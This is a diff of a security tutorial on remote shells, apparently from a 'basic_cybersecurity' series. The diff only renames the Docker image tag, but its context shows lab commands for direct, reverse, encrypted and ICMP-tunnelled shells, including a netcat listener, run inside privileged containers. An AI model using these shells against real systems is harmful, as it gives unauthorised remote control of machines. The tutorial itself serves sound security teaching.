@@ -6,11 +6,11 @@ From a security point of view, a remote shell is usually part of a shellcode to 
 
 **Note**: as in previous tutorials, there's a docker container that facilitates reproducing the work of this tutorial. The container can be built with:
 ```bash
-docker build -t basic_cybersecurity5:latest .
+docker build -t basic_cybersecurity6:latest .
 ```
 and runned with:
 ```bash
-docker run --privileged -it basic_cybersecurity5:latest
+docker run --privileged -it basic_cybersecurity6:latest
 ```
 
 ----
@@ -194,7 +194,7 @@ main (int argc, char *argv[])
 ### Direct Remote Shell
 ```bash
 # terminal 1
-docker run --privileged -it basic_cybersecurity5:latest
+docker run --privileged -it basic_cybersecurity6:latest
 root@7e837bd2c6b2:~# ./server 5000
 
 
@@ -202,7 +202,7 @@ root@7e837bd2c6b2:~# ./server 5000
 # we figure out the running docker container's ID
 docker ps
 CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS               NAMES
-7e837bd2c6b2        basic_cybersecurity5:latest   "bash"              24 seconds ago      Up 23 seconds                           ecstatic_golick
+7e837bd2c6b2        basic_cybersecurity6:latest   "bash"              24 seconds ago      Up 23 seconds                           ecstatic_golick
 # get a shell into the container
 $ docker exec -it 7e837bd2c6b2 bash
 # get a direct remote shell
@@ -221,7 +221,7 @@ Linux 7e837bd2c6b2 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_
 or running server in the docker container and client in the host machine:
 ```
 # terminal 1
-docker run --privileged -p 5000:5000 -it basic_cybersecurity5:latest
+docker run --privileged -p 5000:5000 -it basic_cybersecurity6:latest
 root@81bffa48f8a3:~# ./server 5000
 
 
@@ -237,13 +237,13 @@ Note that we had to map port 5000 between docker and the host OS.
 ### Reverse Remote Shells
 ```bash
 # terminal 1
-$ docker run --privileged -p 5000:5000 -it basic_cybersecurity5:latest
+$ docker run --privileged -p 5000:5000 -it basic_cybersecurity6:latest
 root@812b61f0f7cc:~# nc -l -p 5000
 
 # terminal 2
 docker ps
 CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS                    NAMES
-812b61f0f7cc        basic_cybersecurity5:latest   "bash"              3 seconds ago       Up 6 seconds        0.0.0.0:5000->5000/tcp   reverent_haibt
+812b61f0f7cc        basic_cybersecurity6:latest   "bash"              3 seconds ago       Up 6 seconds        0.0.0.0:5000->5000/tcp   reverent_haibt
 docker exec -it 812b61f0f7cc bash
 root@812b61f0f7cc:~#
 root@812b61f0f7cc:~# ./client 127.0.0.1 5000
@@ -537,13 +537,13 @@ Let's try it out:
 
 ```bash
 # In one terminal
-docker run --privileged -p 5000:5000 -it basic_cybersecurity5:latest
+docker run --privileged -p 5000:5000 -it basic_cybersecurity6:latest
 root@ab97f27ecde6:~# ./crypt_shell s 5000
 
 # In the other terminal
 $ docker ps
 CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS                    NAMES
-ab97f27ecde6        basic_cybersecurity5:latest   "bash"              2 minutes ago       Up 2 minutes        0.0.0.0:5000->5000/tcp   pedantic_lamarr
+ab97f27ecde6        basic_cybersecurity6:latest   "bash"              2 minutes ago       Up 2 minutes        0.0.0.0:5000->5000/tcp   pedantic_lamarr
 victor at Victors-MacBook in ~/basic_cybersecurity/tutorial5 on master*
 $ docker exec -it ab97f27ecde6 bash
 root@ab97f27ecde6:~# ./crypt_shell a 127.0.0.1 5000
@@ -952,12 +952,12 @@ Let's try it out:
 ```bash
 # In the first terminal
 docker network create testnet
-docker run --privileged --net testnet -it basic_cybersecurity5:latest
+docker run --privileged --net testnet -it basic_cybersecurity6:latest
 root@d1c09e1b8f84:~# ./icmp_shell c 172.18.0.3
 + Raw to '172.18.0.3' (type : 0)
 
 # In the second terminal
-docker run --privileged --net testnet -it basic_cybersecurity5:latest
+docker run --privileged --net testnet -it basic_cybersecurity6:latest
 root@c134e2dbde63:~# ./icmp_shell s 172.18.0.2
 + Raw to '172.18.0.2' (type : 0)
 
